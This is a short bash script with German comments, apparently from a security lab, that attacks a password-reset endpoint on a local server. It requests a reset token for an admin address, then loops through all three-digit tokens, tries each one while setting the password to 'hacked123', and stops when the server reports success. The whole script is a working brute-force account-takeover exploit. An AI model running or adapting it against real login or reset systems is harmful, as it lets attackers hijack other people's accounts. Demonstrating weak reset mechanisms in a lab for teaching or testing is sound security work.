#!/bin/bash

# Brauchen wir weil die SESSION sonst nicht bei beiden Request zugeorndert wird. 
COOKIE_JAR=cookies.txt

# Token generieren
echo "Generiere Token..."
curl -s -c $COOKIE_JAR "http://localhost:8080/security/bad-reset-mechanism/reset.php?action=request_reset&email=admin@company.com"
echo ""

# Brute Force
echo "Starte Brute Force Angriff..."
for i in {000..999}; do
    RESULT=$(curl -s -b $COOKIE_JAR "http://localhost:8080/security/bad-reset-mechanism/reset.php?action=try_token&token=$i&new_password=hacked123")
    echo "Token $i: $RESULT"
    if [[ $RESULT == *"success\":true"* ]]; then
        echo "🎯 TREFFER! Token gefunden: $i"
        break
    fi
done
